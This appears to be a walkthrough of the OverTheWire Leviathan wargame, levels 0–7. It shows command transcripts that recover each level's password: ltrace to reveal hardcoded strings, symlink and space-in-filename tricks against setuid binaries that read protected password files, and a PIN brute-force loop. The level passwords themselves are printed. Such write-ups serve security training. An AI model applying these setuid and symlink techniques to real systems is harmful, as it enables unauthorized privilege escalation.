# Leviathan

## Level 0

```bash
sshpass -p leviathan0 ssh leviathan0@leviathan.labs.overthewire.org -p 2223
```

## Level 0 → Level 1

```bash
leviathan0@leviathan:~$ cat .backup/bookmarks.html | grep leviathan
<DT><A HREF="http://leviathan.labs.overthewire.org/passwordus.html | This will be fixed later, the password for leviathan1 is rioGegei8 m" ADD_DATE="1155384634" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">password to leviathan1</A>
```

## Level 1 → Level 2

```bash
leviathan1@leviathan:~$ file check
check: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=c735f6f3a3a94adcad8407cc0fda40496fd765dd, not stripped
leviathan1@leviathan:~$ ltrace ./check
__libc_start_main(0x804853b, 1, 0xffffd744, 0x8048610 <unfinished ...>
printf("password: ")                                                                                                          = 10
getchar(1, 0, 0x65766f6c, 0x646f6700password: 123
)                                                                                         = 49
getchar(1, 0, 0x65766f6c, 0x646f6700)                                                                                         = 50
getchar(1, 0, 0x65766f6c, 0x646f6700)                                                                                         = 51
strcmp("123", "sex")                                                                                                          = -1
puts("Wrong password, Good Bye ..."Wrong password, Good Bye ...
)                                                                                          = 29
+++ exited (status 0) +++
leviathan1@leviathan:~$ ./check
password: sex
$ whoami
leviathan2
$ cat /etc/leviathan_pass/leviathan2
ougahZi8Ta
```

## Level 2 → Level 3

```bash
leviathan2@leviathan:~$ ltrace ./printfile /etc/leviathan_pass/leviathan3
__libc_start_main(0x804852b, 2, 0xffffd714, 0x8048610 <unfinished ...>
access("/etc/leviathan_pass/leviathan3", 4)                                                                                   = -1
puts("You cant have that file..."You cant have that file...
)                                                                                            = 27
+++ exited (status 1) +++
leviathan2@leviathan:~$ mkdir /tmp/mg2
leviathan2@leviathan:~$ touch /tmp/mg2/file
leviathan2@leviathan:~$ ltrace ./printfile /tmp/mg2/file
__libc_start_main(0x804852b, 2, 0xffffd724, 0x8048610 <unfinished ...>
access("/tmp/mg2/file", 4)                                                                                                    = 0
snprintf("/bin/cat /tmp/mg2/file", 511, "/bin/cat %s", "/tmp/mg2/file")                                                       = 22
geteuid()                                                                                                                     = 12002
geteuid()                                                                                                                     = 12002
setreuid(12002, 12002)                                                                                                        = 0
system("/bin/cat /tmp/mg2/file" <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                                                        = 0
+++ exited (status 0) +++
leviathan2@leviathan:~$ cd /tmp/mg2
leviathan2@leviathan:/tmp/mg2$ ln -s /etc/leviathan_pass/leviathan3 /tmp/mg2/pass
leviathan2@leviathan:/tmp/mg2$ touch pass\ file
leviathan2@leviathan:/tmp/mg2$ ~/printfile "pass file"
Ahdiemoo1j
```

## Level 3 → Level 4

```bash
leviathan3@leviathan:~$ ./level3
Enter the password> aaa
bzzzzzzzzap. WRONG
leviathan3@leviathan:~$ ltrace ./level3
__libc_start_main(0x8048618, 1, 0xffffd744, 0x80486d0 <unfinished ...>
strcmp("h0no33", "kakaka")                                                                                                    = -1
printf("Enter the password> ")                                                                                                = 20
fgets(Enter the password> aaa
"aaa\n", 256, 0xf7fc55a0)                                                                                               = 0xffffd550
strcmp("aaa\n", "snlprintf\n")                                                                                                = -1
puts("bzzzzzzzzap. WRONG"bzzzzzzzzap. WRONG
)                                                                                                    = 19
+++ exited (status 0) +++
leviathan3@leviathan:~$ ./level3
Enter the password> snlprintf
[You've got shell]!
$ whoami
leviathan4
$ cat /etc/leviathan_pass/leviathan4
vuH0coox6m
```

## Level 4 → Level 5

```bash
leviathan4@leviathan:~$ .trash/bin | perl -lape '$_=pack"(B8)*",@F'
Tith4cokei
```

## Level 5 → Level 6

```bash
leviathan5@leviathan:~$ ltrace ./leviathan5
__libc_start_main(0x80485db, 1, 0xffffd744, 0x80486a0 <unfinished ...>
fopen("/tmp/file.log", "r")                                                                                                   = 0x804b008
fgetc(0x804b008)                                                                                                              = '\377'
feof(0x804b008)                                                                                                               = 1
fclose(0x804b008)                                                                                                             = 0
getuid()                                                                                                                      = 12005
setuid(12005)                                                                                                                 = 0
unlink("/tmp/file.log")                                                                                                       = 0
+++ exited (status 0) +++
leviathan5@leviathan:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
leviathan5@leviathan:~$ ./leviathan5
UgaoFee4li
```

## Level 6 → Level 7

```bash
leviathan6@leviathan:~$ for i in {0000..9999}; do ./leviathan6 $i; done
$ cat /etc/leviathan_pass/leviathan7
ahy7MaeBo9
```
